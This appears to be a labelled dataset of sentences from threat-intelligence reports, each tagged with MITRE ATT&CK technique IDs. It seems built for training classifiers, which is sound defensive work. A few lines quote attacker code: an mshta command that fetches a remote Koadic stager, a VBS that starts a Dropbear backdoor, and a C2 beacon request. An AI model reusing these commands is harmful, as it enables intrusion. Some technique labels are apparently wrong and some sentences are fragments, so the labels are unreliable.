uses the SmartAssembly obfuscator to pack an embedded .Net Framework assembly used for C2.	['T1027.002']
uses  to list TCP connection status.	['T1049']
uses  to perform remote service manipulation to execute a copy of itself as part of lateral movement.	['T1569.002']
uses two utilities, GETMAIL and MAPIGET, to steal email. GETMAIL extracts emails from archived Outlook .pst files, and MAPIGET steals email still on Exchange servers that has not yet been archived.	['T1114']
uses various XOR techniques to obfuscate its components.	['T1027']
uses Windows admin shares to establish authenticated sessions to remote systems over SMB as part of lateral movement.	['T1021.002']
uses WMI to perform process monitoring.	['T1047']
variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.	['T1218.010']
version of  communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string “&&&”	['T1071']
When it first starts,  spawns a new thread to log keystrokes.	['T1056']
When the  command and control is operating over HTTP or HTTPS, Duqu uploads data to its controller by appending it to a blank JPG file.	['T1001']
will delete files on the system.	['T1070.004']
will zip up the /Library/Keychains directory before exfiltrating it.	['T1560']
writes collected data to a temporary file in an encrypted form before exfiltration to a C2 server.	['T1486']
[2] Threat groups use strategic web compromises (SWCs), also known as watering hole attacks, to target a wide array of potential victims	['T1189']
The majority of ActiveX Objects created with Wscript.Shell and Shell.Application are used to run programs, create shortcuts, manipulate the contents of the registry, or access system folders	['T1059']
The threat actors used the appcmd command-line tool to unlock and disable the default logging component on the server (systsm.webServer/httplogging) and then delete existing logs from the system (see Figure 4)	['T1059']
Gather network addresses and operating system version Execute arbitrary commands using “cmd.exe /c”  The capability to execute system commands	['T1059']
Both variants need to be executed with the command line argument “[2]” to avoid continually attempting to copy and execute the Trojan using the “tmp.vbs” and “tmp1.vbs” files	['T1059']
/user <parameters>: Executes downloaded file with parameters specified using CreateProcessAsUser cmd /c <command>: Executes command on infected endpoint   Conclusion  The actor behind Honeybee has been operating with new implants since at least November 2017 with the first known version of NTWDBLIB installer	['T1059']
Traps provides endpoint protection, as it can block Excel from creating a command prompt process	['T1059']
Access remote objects interactively from the pupy shell and get auto-completion of remote attributes	['T1059']
It is used to create new processes, perform as a command line shell, and several other tasks	['T1059']
We analyzed the command handler and found that it provided the necessary commands for a fully functional backdoor, as seen in Table 1	['T1059']
The 2.0 versions require a dropper to decipher and launch the AES encrypted QUASARRAT payload	['T1027']
The code is obfuscated in order to hide any malicious activity on the remote server	['T1027']
This strangeness was related to values listed in newer BlackEnergy configuration files	['T1027']
These requests are encrypted using the RC4 algorithm	['T1027']
The launcher module, obfuscated with the notorious Metasploit’s shikata_ga_nai encoder, is the same for all the droppers	['T1027']
After decompiling it from the PE file, it is heavily obfuscated and still almost unreadable.We deobfuscated the script to understand how the infection process works	['T1027']
Code snippet of the obfuscated document After deobfuscation, we can see that the payload is written in the Perl programming language	['T1027']
Its developer used the open source Invoke-Obfuscation tool to obfuscate this PowerShell script, specifically using the COMPRESS technique offered by Invoke-Obfuscation	['T1027']
The Trojan accesses two resources, named Sch and VBS that contains obfuscated strings that contain the command to create the scheduled task and the VBScript to run	['T1027']
A closer examination revealed the obfuscation used by the OilRig group in these QUADAGENT samples were likely the result of using an open-source toolkit called Invoke-Obfuscation	['T1027']
Invoke-Obfuscation calls the string obfuscation used by the actors to further obfuscate this script Reorder, which uses the string formatting functionality within PowerShell to reconstruct strings from out of order substrings (ex	['T1027']
The C&C server then replies with the encrypted serialized configuration	['T1027']
The payload (abbad7acd…) is an executable that appears to have been created by a VBScript to Executable tool and further obfuscated with a cryptor	['T1027']
Navigating to the web page manually to view:source reveals the code, which at the time of writing happened to not be obfuscated in any significant way	['T1027']
The file uses a character insertion obfuscation technique, making it appear to contain Chinese characters.	['T1027']
"The ""Blackwater.bas"" macro was obfuscated using a substitution cipher whereby the characters are replaced with their corresponding integer."	['T1027']
Note that every string is decrypted with different XOR parameter which may fail some of the automatic analyzers.	['T1027']
Analysis of the domains and IP address infrastructure used by APT15 identified a number of similar possible domains, shown at the bottom of the post	['T1016']
By running SSH on the server in a compromised network, attackers can come back to the network whenever they want	['T1016']
Regular Expressions   ([^r-v\\s])[r-v]([\\w\\d+\\/=]+)-\\w+.(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\s+(([a-fA-F0-9]{0,4}:{1,4}[\\w|:]+){1,8})   Address:\\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8})   ([^r-v\\s]+)[r-v]([\\w\\d+\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   (\\w+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\s+(\\d+.\\d+.\\d+.\\d+)    Table 3 Regular expressions used by RogueRobin The C# variant, like its PowerShell relative, will issue DNS queries to determine which query types can successfully communicate with its C2 servers	['T1016']
DHS and FBI are distributing these IP addresses to enable network defense activities and reduce exposure to the DDoS command-and-control network	['T1016']
RATANKBA looking for specific IP ranges Our analysis of samples of the hack tool (HKTL_NBTSCAN.GA and HKTL_NBTSCAN.GB) indicate it as a command-line program that scans IP networks for NetBIOS information such as IP address, NetBIOS computer name, logged-in username, and MAC address—with some of the information coming from the initial RATAKNBA installation	['T1016']
Based on dynamic and static analysis of the malware sample associated with the supservermgr[.]com domain however, we were able to determine several unique artifacts which allowed us to expand our dataset and discover additional findings	['T1016']
(Source: Dell SecureWorks) Appendix D — Domain name parking example CTU researchers have observed TG-3390 parking domains by pointing their A record to a non-routable IP space, including the 127.0.0.[x] loopback address	['T1016']
Trickbot uses this encrypted module to scan the network and steal relevant network information.	['T1016']
The majority of businesses still maintain Windows-heavy user environments where certain core infrastructure components also operate under Windows servers (e.g., Active Directory, SharePoint, etc.)	['T1010']
Because of Poseidon’s longevity, there are samples targeting Windows systems as early as Windows NT 4.0 Server and Windows 95 Workstation up to current versions like Windows 8.1, as well as server variants (very important to them, given the emphasis on reaching Domain Controllers in corporate environments.) How is this different from any other targeted attack? The extortion elements of this campaign are what set it apart from others	['T1010']
LANS Deletes the file created by the LAN command to reverse the effect	['T1070.004']
USBS Deletes the file created by the USB command to reverse the effect	['T1070.004']
DEL Deletes a specified file	['T1070.004']
After running the malware, the batch script goes on to cleans up all signs of its existence on the system, this includes:  Deletion of all initial files created during installation, as well as all associated files required on disk during initial execution	['T1070.004']
Kaspersky Lab products detect the malware used by Poseidon Group with the following detection names: Backdoor.Win32.Nhopro HEUR:Backdoor.Win32.Nhopro.gen HEUR:Hacktool.Win32.Nhopro.gen How many victims have you found? At least 35 victim companies have been identified with primary targets including financial and government institutions, telecommunications, manufacturing, energy and other service utility companies, as well as media and public relations firms	['T1070.004']
Both “%APPDATA%\\Microsoft\Windows\Cookies.txt” and “%APPDATA%\\Microsoft\Windows\Cookies.exe” are then deleted	['T1070.004']
Once they are deleted by the attackers’ code, there is nothing left to be forensically recovered.	['T1070.004']
OSinfo: OSInfo is a general purpose, system information gathering tool	['T1082']
infoClient is reponsible for collecting OS info, submitting this info to its C&C servers (the servers are malicious in nature), and receiving additional C&C communication information	['T1082']
"POST /api/osx/started HTTP/1.1Host: r2elajikcosf7zee.onion.toAccept: */*Content-Length: 233Content-Type: application/x-www-form-urlencodedbot_id=9a8965ba04e72909f36c8d16aa801794c6d905d045c2b704e8f0a9bbb97d3eb8&amp;data=psX0DKYB0u...5TximyY%2BQY%3D     Figure 10: Malware sending initial information       &gt; rc4decrypt(base64decode(""psX0DKYB0u...5TximyY+QY=""), ""u2RLhh+!LGd9p8!ZtuKcN"")device_model=MacBookPro9,2bot_version=1.3.5build_name=elitef*ckos_version=15.5.0ip_address=4.5.6.7has_root=0     Figure 11: Decoded data sent to C&C The bot_id is constructed by hashing the following values with SHA-256:  The hardware UUID (IOPlatformUUID) The system serial number (IOPlatformSerialNumber) The model identifier of the Mac (e.g.: MacBookPro9,2)  Most actions are self-explanatory"	['T1082']
This information allows a threat actor to determine if their messages were delivered, which users are more susceptible to opening them, and basic information regarding the target’s operating system and e-mail client (or browser)	['T1082']
The main purpose of the IGT tool is to make an inventory of the system, saving information from the network interfaces and addresses, credentials belonging to the Domain and database server, services being run from the OS and everything that could help the Poseidon Group make its attack more customized to its victim	['T1082']
Two of them are MacOS X User-Agents and the third is a hashed string:  Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/BADDAD Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405   E9BC3BD76216AFA560BFB5ACAF5731A3   Figure 5: SpeakUp `s requests are encrypted with the salted base64 and include the unique User-Agent At the moment SpeakUp serves XMRig miners to its listening infected servers	['T1082']
This is the first time that Bankshot has been tied directly to financial-related hacking and the first time it has been used since November 2017	['T1124']
The time of the observed attacker activity coincides with Iran’s Daylight Time, which is +0430 UTC	['T1124']
Cadelle and Chafer are most active during the day time within Iran’s time zone and primarily operate during Iran’s business week (Saturday through Thursday)	['T1124']
The shellcode decodes and decompresses another DLL, which is an updated variant of UPPERCUT	['T1140']
This function is able to obfuscate code so that every iteration of the code is presented differently	['T1140']
The code comparison specifically shows the HighShell code including a salt variable containing di2zag7wZHTK9YR0NGq, which is not present within the TwoFace code on the left	['T1140']
"Here is the code:The goal of this code is to get information from the properties of the document (""Subject"", ""Company"", ""Category"", ""Hyperlink base"" and finally ""Comments"")"	['T1140']
The Visual Basic macro performs the following tasks:  Opens a handle to the malicious document to read the encoded CAB file Decodes the CAB file and writes it to the disk at %temp%\setup.cab   Encoded CAB file in the Word document	['T1140']
The most interesting part is the decrypted C&C configuration, as can be seen in the image below	['T1140']
Backdoor analysis The main loop of the backdoor has two main functions, infoClient and runHandle	['T1140']
To decode this information, BADNEWS takes the following steps:  Base64-decode the string Perform the decoding cipher used in previous versions Base64-decode the result Decrypt the result using the Blowfish algorithm and a static key  A script, which is included in the Appendix, will decrypt data from these dead drop resolvers	['T1140']
The unique strings mainly consist of “Mobile/BADDAD“, “Mobile/7B405” and “E9BC3BD76216AFA560BFB5ACAF5731A3”	['T1140']
The decrypted contents of the log file adhere to the format in Figure 22	['T1140']
Decrypted OwaAuth log file format	['T1140']
"""Are you Happy?"" campaign.""FreeMilk"" campaign.""North Korean Human Rights"" campaign.""Evil New Year 2018"" campaign.On January 2nd of 2018, the ""Evil New Year 2018"" was started"	['T1543', 'T1543.003']
Figure 2: AuditCred/ROptimizer Service If successfully installed, this particular backdoor poses quite a threat to its target	['T1543', 'T1543.003']
HAYMAKER is a backdoor that can download and execute additional payloads in the form of modules	['T1105']
The XSL script contains additional hard coded variables sVarRaz and sVar2RazX, which contain file paths that direct to the downloaded files.   The file’s path	['T1105']
The config file provides download instructions for the loader	['T1105']
Using this information, they can decide to explore further or instruct the compromised computer to download additional malware	['T1105']
Responds to the IRC server via PRIVMSG with “Download  Success :FilePath=<path to downloaded file>” or “Download Fail” if unsuccessful	['T1105']
Figure 4: Downloading second stage Seminar.rtf The downloaded Seminar.rtf contains an embedded binary file that is dropped in %temp% via Equation Editor executable	['T1105']
Anyconnect[.]stream Bigip[.]stream Fortiweb[.]download Kaspersky[.]science microtik[.]stream owa365[.]bid symanteclive[.]download windowsdefender[.]win  The listed C2 servers all resolved to IPs belonging to a service provider in China at 1.2.9.0/24, which is the IP address used by the C2 server to send a cancel communications message to the end system	['T1105']
2 Downloads a file to the system	['T1105']
This includes, but is not limited to, the following:  AES encryption of network communication File management Functionality to download, upload, and execute files Keylogging Remote desktop access Remote webcam viewing Reverse proxy Browser and FTP client password recovery  The images below are what a target user opening a malicious RTF document would see from within Microsoft Word	['T1105']
When opened and then executed, the key components of the HTA file downloads and executes further malware from a remote URLand loads a decoy image hosted externally (Figure 3)	['T1105']
Use of PowerShell to download additional tools	['T1105']
The shellcode of the embedded object is designed to download an image, which is, in fact, a new shellcode used to decode an embedded executable	['T1105']
BUGJUICE defaults to TCP using a custom binary protocol to communicate with the C2, but can also use HTTP and HTTPs if directed by the C2	['T1071']
We recently mentioned this tool in another report on April 16, as this variant of the BONDUPDATER tool used DNS tunneling to communicate with its C2, specifically using TXT queries to receive information from the C2 server	['T1071']
Server Command and control server that communicates via DNS tunneling   Panel Graphical User Interface that allows actors to issue commands, upload and download files to Agents via the Server    Table 2	['T1071']
The Poison Frog server handles both the HTTP and DNS tunneling channels used by the hUpdater.ps1 and dUpdater.ps1 scripts	['T1071']
Its C2 is based on IIS using .asp technology to handle the victims’ HTTP requests	['T1071']
Later variants upload the file to a web server via an HTTP post command	['T1071']
All subsequent interaction with the C2 server uses the same SOAP web service, so we will not show all of the generated HTTP requests	['T1071']
To obtain strings to treat as commands, the payload will issue a series of DNS queries to resolve domains with the following structure: <system id>-<job ID>-<offset data specific to job>.<c2 domain> The C2 server will provide responses to these queries that contain answers in IPv4 or IPv6 addresses depending on the type of DNS query the payload uses to communicate with its C2 server	['T1071']
For instance, the downloader will first attempt to communicate with its C2 server using an HTTPS request	['T1071']
If both attempts fail and the payload is unable to obtain a session ID and pre-shared key via HTTP or HTTPS, it will try to use DNS tunneling	['T1071']
The Trojan will then read the hexadecimal formatted contents of this file in 1500 byte blocks, sending each 1500 bytes of data from the file to the C2 server via an HTTP GET request to a URL with the following structure:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(command prompt output)> The upload command (2) writes data provided by the C2 to a specified file	['T1071']
We have seen the following HTTP POST parameters within the Zebrocy C++ samples: porg structOne oq volume DDE Details The author of the DDE document used in the February 2018 attacks used some obfuscation techniques in an attempt to evade detection	['T1071']
XAgent uses HTTP requests to communicate with its C2 servers, which allows the threat actor to interact with the compromised system	['T1071']
For instance, when using this string we observed DNS queries for “apple-search.infoclose”, as the string “close” was supposed to be the next portion of the C2 URL	['T1071']
The malware sends an HTTP GET request to its C2 IP address using HTTP over port 443	['T1071']
In the order to run the SSH server, the attackers created a VBS file with the following content: Set WshShell = CreateObject(“WScript.Shell”) WshShell.CurrentDirectory = “C:\WINDOWS\TEMP\Dropbear\” WshShell.Run “dropbear.exe -r rsa -d dss -a -p 6789”, 0, false As is evident here, the SSH server will accept connections on port number 6789	['T1547.001']
"The embedded VBScript is retrieved from a resource and decrypted using the same algorithm as discussed above, which results in the following cleartext:       set objshell = createobject(\""wscript.shell\"")objshell.run \""mshta hxxp://86.106.131.177:6500/zIZFh\"",vbhide     The Koadic C2 server will respond to this request with Javascript code that acts as the Koadic staging payload, which allows the actor to run additional Koadic modules on the end system to carry out their post-exploitation activities"	['T1547.001']
NavRAT then creates a registry key in order to execute this file copy at the next reboot of the system, an initial method of persistence	['T1547.001']
This file is then copied to a filename of ‘Windows Update.lnk’, which is placed in the startup path previously identified	['T1547.009']
This shortcut file points to the path of the previously written ‘winhelp.cpl’ file	['T1547.009']
It then sends the following IRC commands: NICK bxphzrjbxp USER bxphzrjbxp bxphzrjbxp bxphzrjbxp bxphzrjbxp To make sure it connected to the correct server, the Trojan checks for the message sent from the IRC server after the bot connects: Welcome to the MpkNet IRC Network The MPK bot does not join a specific IRC channel, instead sending private messages (PRIVMSG) to a user with the nick “mpk”	['T1132']
This encoded information then gets an additional header added and sent across the network.	['T1132']
Attack Overview The attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails	['T1598.002']
Attached to this email was a malicious Microsoft Word document (MD5: f6fafb7c30b1114befc93f39d0698560) that exploited CVE-2012-0158	['T1598.002']
Like past attacks, the initial infection vector is a malicious Word document attached to a phishing email that is well-tailored to the targeted business and its day-to-day operations	['T1598.002']
MAGIC HOUND TOOLSET The Magic Hound attacks did not rely on exploit code to compromise targeted systems, instead relying on executables and Microsoft Office documents, specifically Excel and Word documents containing malicious macros	['T1598.002']
The emails had a malicious Excel macro document attached, which when executed led to a new Microsoft Visual Basic (VB) script-based malware family which we are dubbing “BabyShark”	['T1598.002']
The initial infection vector of this campaign is a Microsoft Office Excel Worksheet with an Office macro that uses the mshta.exe Windows executable to run scripts, which are embedded in the HTML of a specially-crafted blogspot.com page	['T1598.002']
The majority of delivery documents contain a generic lure image requesting the victim enable macros with no additional content, the adversaries seemingly relying solely on lure filenames to entice victims to launch the malicious document	['T1204']
These documents contained malicious OLE objects used to drop binaries.This time, however, they contained malicious OLE (Object Link Embedded) objects.Initial analysis confirmed two similarly sized OLE object files within this document which appeared to be the same from an execution point of view.The two dropped binaries were stored and executed in this location during our analysis:C:\Users\ADMINI~1\AppData\Local\Temp\Hwp (2).exeC:\Users\ADMINI~1\AppData\Local\Temp\Hwp (3).exeInitial analysis showed some sloppy cleaning up from Group123, which we used later to determine that separate campaigns were the work of this same actor, as compilation artifacts remained within the binaries:e:\Happy\Work\Source\version 12\T+M\Result\DocPrint.pdbThe second stage of the dropped binaries was used to execute wscript.exe while injecting shellcode into this process	['T1204']
Cluster A Case 1: Delivery via document property macro – a789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483  In our research we found at least one attack against a company leveraging a Microsoft Office Excel document with an embedded macro to launch the malware	['T1204']
Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image.	['T1204']
The file, named Microsoft.Win32.TaskScheduler.dll, is digitally signed by a certificate from AirVPN	['T1553.002']
The DLL is also digitally signed by a certificate from “AirVPN”	['T1553.002']
If the <flag> field of the message header is greater than one, the XOR key used to encrypt message bodies is iterated in reverse when encrypting and decrypting messages	['T1573']
Initially, the key is sent to the C2 server with the entire message and headers encrypted with the RSA key exchange algorithm	['T1573']
The AES key is unique for each communication and is encrypted with one of two RSA public keys	['T1573']
One of the malware families tied to this group, BADNEWS, continues to be updated both in how it uses dead drop resolvers, as well as how it communicates with a remote C2 server	['T1102']
The tool would connect to the SQL SharePoint database and issue a query to dump all data from the database to a temporary file affixed with 'spdata'	['T1003']
The information contained in this data dump include:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Scripts to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  The Leak In mid-March 2019, an unknown entity appeared on several hacking forums and Twitter with the user handle @Mr_L4nnist3r claiming they had access to data dumps involving internal tools and data used by the OilRig group	['T1003']
The credentials appear to have been stolen via multiple techniques, including using post-exploition password recovery tools such as MimiKatz or its variant ZhuMimiKatz	['T1003']
In addition to these tools, we believe OilRig attackers obtained credentials through, bruteforcing, SQL injections, and using traditional credential harvesting toolkits as we discussed in the Striking Oil blog published in September 2017	['T1003']
We are unable to confirm if all of these stolen credentials are indeed valid sets of credentials, but based upon previously observed activity, timestamping, and known behaviors, it is highly probable that these credentials were or may still be valid	['T1003']
Vault was implemented in Windows 7, it contains any sensitive data (like the credentials) of Internet Explorer	['T1003']
Also, the use of the  mimikatz and pwdump tools suggests the adversary attempts to dump credentials on compromised systems	['T1003']
DRIVE Lists the logical drives and the type, as well the total/free space of the fixed devices	['T1083']
Command Description   !Dir Lists the contents of a specified directory   !Drives Enumerates the storage drives attached to the system and their respective type	['T1083']
The dropped files are either in the root of the “ProgramData” folder or in a subdirectory	['T1083']
Figure 7: Property list file in LaunchAgents directory To camouflage the location of the malicious file, Keydnap replaces argv[0] with /usr/libexec/icloudsyncd –launchd netlogon.bundle	['T1083']
.iqy files are simple text files containing a URL which are opened by default by Excel	['T1083']
These platforms may not be well maintained and may break intermittently	['T1083']
Open directory listing of hxxp://stevemike-fireforce[.]info/ Based on the contents and structure of the initial identified open directories, it was possible to find several infrastructure patterns in use	['T1083']
Figure 2: Zyklon attack flow Infection Techniques CVE-2017-8759 This vulnerability was discovered by FireEye in September 2017, and it is a vulnerability we have observed being exploited in the wild	['T1203']
Second, the threat actors exploit CVE-2017-8570 to achieve code execution via a malicious “scriptlet” file, or .sct file, which is also embedded in the malicious RTF document	['T1203']
Attack chain of Tropic Trooper’s operations Here’s a summary of the attack chain of Tropic Trooper’s recent campaigns:  Execute a command through exploits for CVE-2017-11882 or CVE-2018-0802, security flaws in Microsoft Office’s Equation Editor (EQNEDT32.EXE)	['T1203']
The attack involved the new HAWKBALL backdoor being delivered via well-known Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802.	['T1203']
The attacker leveraged multiple exploits, targeting both CVE-2014-6332 and CVE-2014-4113	['T1068']
Organizations that Buckeye targeted over time, per region Malware and tools Buckeye uses a number of hacking tools as well as malware	['T1518.001']
This group was observed using tactics such as registering typosquatting domains for security or technology vendors, abusing open-source penetration testing tools, and leveraging novel file types as anti-analysis techniques	['T1518.001']
Keep security software up-to-date with the latest definitions  Protection Norton Security, Symantec Endpoint Protection, and other Symantec security products protect users against these threats through the following detections: AV  Backdoor.Cadelspy Backdoor.Remexi Backdoor.Remexi.B  IPS  System Infected: Backdoor.Cadelspy Activity 2 System Infected: Backdoor.Remexi Activity  Indicators of compromise We have also compiled an indicators-of-compromise document containing further details which can be used to help identify the threats if they are present in your environment	['T1518.001']
Enterprises can benefit from Trend Micro’s Smart Protection Suites with XGen security, which infuses high-fidelity machine learning into a blend of threat protection techniques to eliminate security gaps across any user activity and any endpoint	['T1518.001']
[9] “HKU concern group raises proxy fears in key vote.” EIJ Insight	['T1090']
In addition to using RDP for lateral movement, APT39 has used this protocol to maintain persistence in a victim environment	['T1021.001']
APT40 has been observed consolidating files acquired from victim networks and using the archival tool rar.exe to compress and encrypt the data before exfiltration	['T1560']
The results are Gzipped and saved under random file in the temp folder.	['T1560']
TG-3390 attempts to reenter the environment by identifying accounts that do not require two-factor authentication for remote access solutions, and then brute forcing usernames and passwords	['T1110']
This version injects a malicious module into one of Avast's processes, whereas early versions of the campaign detected Avast and quit	['T1055']
Injects ma32.dll into “wwahost.exe” or “audacity.exe”	['T1055']
FakeRun’s PDB string (D:\Work\Project\VS\house\Apple\Apple_20180115\Release\FakeRun.pdb) indicates the loader will execute dllhost.exe and inject one malicious DLL file, which is the backdoor, into this process	['T1055']
20 New processes The malicious svchost constantly queries ieframe.dll, as well as IWebBrowser2 Interface using CLSID dc30c1661-cdaf-11D0-8A3E-00c04fc9e26e, both key components to interact with Internet Explorer	['T1055']
The encoded payload was a Cobalt Strike httpsstager that was injected into the PowerShell process that ran the command	['T1055']
After finding the process id, the shellcode uses standard functions to allocate and write memory within Explorer and then uses low-level API RtlCreateUserThread for thread injection.	['T1055']
Instead of using systeminfo and tasklist commands, the C# variant of Zebrocy uses WMI queries to gather this information	['T1047']
Subscriptions consist of three core WMI classes: a Filter, a Consumer, and a FilterToConsumerBinding	['T1047']
This suggests that other WMI-based VM detection techniques may also detect certain physical systems if those systems do not support the specific WMI query	['T1047']
Perhaps they plan to pair this stealer with another dropper that maintains the WMI anti-AV functionality	['T1047']
FeedBack.php validates the sender by User-Agent, saves the data in the “RAR” server directory and stores the metadata in the mssql database for later reference	['T1074']
On the next step this file is executed by rundll32.exe via the KlpSvc export	['T1218.011']
19-1 regsvr32 running the .dlls  Fig	['T1218.010']
It should be noted that in most of these cases the backdoor was embedded as a packed payload in another executable or in a weaponized document file of some kind	['T1027.002']
An interesting note on these payloads is that all the Delphi payloads delivered in this campaign were packed with UPX, while none of the other payloads were packed	['T1027.002']
Obfuscation While the downloader module is not packed, the backdoor is packed with a modified version of UPX	['T1027.002']
Can be packed into a single .py file and run without any dependencies other than the python standard library on all OSes	['T1027.002']
This is consistent with most espionage-motivated adversaries, as once the adversary gains access via legitimate credentials, they are able to masquerade as a legitimate user and essentially become an insider threat	['T1036']
CTU researchers identified BRONZE UNION actors using a file named ms.exe that was likely a credential-abuse tool from the Kekeo toolset	['T1036']
Bankshot implants are distributed from a domain with a name similar to that of the cryptocurrency-lending platform Falcon Coin, but the similarly named domain is not associated with the legitimate entity	['T1036']
Additionally, some of this early activity shares a similarity with current FIN7 operations – the use of Power Admin PAExec for lateral movement	['T1021.002']
There was a slight deviation in the November grouping, where the three samples we collected still used the Joohn author name for the last modified field but reverted to a default USER/user author name for the creator field	['T1033']
Also, this variant of OopsIE uses the output of the whoami command as the parameter within the URL when communicating with the C2 server, which differs from the previous OopsIE variant that used the hostname and username from the environment variables	['T1033']
These strings have the following format:uuid=[Victim ID]#un=[Username]#cn=[Hostname]#on=[OS Version]#lan=[IP Address]#nop=#ver=1.0uuid=[Victim ID]#un=[Username]#An example of the first string may be seen below:uuid=e29ac6c0-7037-11de-816d-806e6f6e696351c5#un=Josh Grunzweig#cn=WIN-LJLV2NKIOKP#on=mav6miv1#lan=192.168.217.141#nop=#ver=1.0It should be noted that the variables used for this string are different from previous versions	['T1033']
When the malicious ISAPI filter captures a username matching this variable, it knows to handle the incoming HTTP request as a command to the web shell	['T1033']
Code comparison between the default batch script issued by Poison Frog’s C2 and a batch script received by the Helminth Trojan Webshells The data dump included several different webshells apparently used by OilRig to interact with compromised servers	['T1059', 'T1064']
When, finally, the first stage shellcode receives a special “FF” signal, it then executes the delivered shellcode	['T1059', 'T1064']
Specifically, we discovered code in the PowerShell script that was a match for code in Magic Unicorn containing the comment “one line shellcode injection with native x86 shellcode”	['T1059', 'T1064']
However, in order to kick off the execution of the malware the attacker uses a batch script which executes the malware, but the batch script does more than simply initiate execution of the malware	['T1059', 'T1064']
The full contents of the batch script are given in Appendix C – a.bat	['T1059', 'T1064']
Can capture all screen (“AllScreen”) or the active window (“ActiveWindow”)   -ms Screenshot file name to save in Cache006 subdirectory, zipped with password from configuration	['T1113']
The second email references a Hong Kong University alumni organization that fears votes in a referendum to appoint a Vice-Chancellor will be co-opted by pro-Beijing interests.[9]  Figure 1: Lure Screenshots The group’s previous activities against financial and policy organizations have largely focused on spear phishing emails written in English, destined for Western audiences	['T1113']
The C2 server can also send a PowerShell command to capture and store a screenshot of a victim’s system	['T1113']
It also deletes Windows Event Logs : Application, Security, Setup, System	['T1070']
As mentioned previously, Buckeye also uses a number of hacking tools, including the following: Keylogger: The keylogger is configured using the command line parameters: NetworkService, Replace, Install, Register and Unregister	['T1056']
Example of decoded keylogger output	['T1056']
XAgent C2 Communications The macOS variant of XAgent has ability to receive commands from threat actors via its command and control channel, but is also capable of logging key strokes via its keylogger functionality	['T1056']
(Source: SecureWorks) Some payloads leveraged DLL side loading, a technique that involves running a legitimate, typically digitally signed, program that loads a malicious DLL	['T1574.002']
Hunter queried the following URIs in a specific order to determine if the associated software configurations are insecure, and all queries contained the HttpClient User-Agent:  GET /manager/html/ — Tomcat web application manager GET /jmx-console/ — JBoss configuration GET /CFIDE/administrator/login.cfm — ColdFusion configuration  Installation TG-3390 uses DLL side loading, a technique that involves running a legitimate, typically digitally signed, program that loads a malicious DLL	['T1574.002']
Figure 1: Code from 29[.]html scheduling the first task to run a script from pastebin The second task (“MSOFFICEER”) in Figure 2 runs the script contents of a different page of the same blog, blog-page[.]html, every 100 minutes	['T1053', 'T1053.005']
Cyber threat groups’ access to the media organization’s networks could potentially provide the government advance warning on upcoming protests, information on pro-democracy group leaders, and insights needed to disrupt activity on the Internet, such as what occurred in mid-2014 when several websites were brought down in denial of service attacks.[8] Threat Actors Use Spear Phishing Written in Traditional Chinese Script in Attempted Intrusions In August 2015, the threat actors sent spear phishing emails to a number of Hong Kong-based media organizations, including newspapers, radio, and television	['T1598.003']
Group123 Links?  As we explore the Korean malware landscape, we always have burning questions relating to any possible links with Group123	['T1598.003']
It’s important to remember, that while we were using Bitly links to help gauge click location, anyone who clicks these links (including researchers) are also counted	['T1598.003']
Visitors are asked to download the “University Of Oxford Job Symposium Pre-Register Tool”:  The downloaded file (which is also signed with an AI Squared certificate), is a fake registration tool built by the attackers: OxfordSymposiumRegTool.exe f77ee804de304f7c3ea6b87824684b33 If run by the victim, their computer would get infected, while they are shown this registration process:    Note that after completing the “registration process”, the victim is asked to send the form to an email address in oxford-careers[.]com, which also belongs to the attackers	['T1057']
Verifies that there is no process with the name “rsyncd” on the active process list (“dbus-inotifier” if the Trojan does not have root privileges)	['T1057']
It is created as a separate process instead of child process of Office applications	['T1057']
After writing to this file, the Trojan will enter a loop to continually to check for changes to the modification time of this file, effectively waiting for the actor to make modifications to the file	['T1070.006']
- There were two interesting sub-classes found inside Main Activity: Receiver and Sender	['T1562.001']
It appears the same actor developed both the Komplex and XAgentOSX tools, based on similarities within the following project paths found within the tools: Komplex: /Users/kazak/Desktop/Project/komplex XAgent OSX: /Users/kazak/Desktop/Project/XAgentOSX We believe it is possible that Sofacy uses Komplex to download and install the XAgentOSX tool to use its expanded command set on the compromised system	['T1087']
"Section 1 The first section of the PowerShell script is responsible for setting different key variables that are used by the remaining sections of the PowerShell script, especially the following variables:  TEMpPAtH = ""C:\ProgramData\"" (the path used for storing the temp files) Get_vAlIdIP = https://api.ipify.org/ (used to get the public IP address of the machine) FIlENAmePATHP = WindowsDefender.ini (file used to store Powershell code) PRIVAtE = Private Key exponents PUbLIc = Public Key exponents Hklm = ""HKLM:\Software\"" Hkcu = ""HKCU:\Software\"" ValuE = ""kaspersky"" SYSID DrAGon_MidDLe = [array of proxy URLs]  Among those variables, there is one variable of particular interest, DrAGon_MidDLe, which stores the list of proxy URLs (detailed at the end of the blog in the Network Indicators portion of the Indicators of Compromise section) that will be used to interact with the C2 server, as shown in Figure 12"	['T1546.013', 'T1059.001']
After decoding out the blob, analysts found a PowerShell script.	['T1546.013', 'T1059.001']
"The macro contains a PowerShell script to persist in the ""Run"" registry key, ""KCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemTextEncoding""."	['T1546.013', 'T1059.001']
A code comparison of hash 12c786c490366727cf7279fc141921d8 with hash 6de6a0df263ecd2d71a92597b2362f2c (from November 28, 2017).  Conclusion We have found what may be an early data-gathering stage for future possible heists from financial organizations in Turkey (and possibly other countries)	['T1550.002']
The payload then calls the VirtualAllocEx API to create a buffer in the newly hollowed process and the WriteProcessMemory API to write the supplied data buffer that contains the code to inject to this newly created buffer	['T1106']
FInally , the newest sample uses dynamic API lookups to attempt to make static disassembly harder to understand.	['T1106']
